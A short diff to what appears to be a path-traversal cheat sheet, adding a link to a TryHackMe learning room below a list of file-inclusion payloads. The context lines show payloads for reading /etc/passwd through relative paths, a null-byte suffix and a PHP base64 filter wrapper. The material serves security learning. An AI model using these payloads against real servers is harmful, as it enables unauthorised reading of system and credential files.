@@ -14,3 +14,5 @@ Absolute path >> /var/www/images/../../../etc/passwd
 Using null byte >> ../../../etc/passwd%00.png
 Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
 ```
+## To learn
+https://tryhackme.com/r/room/filepathtraversal
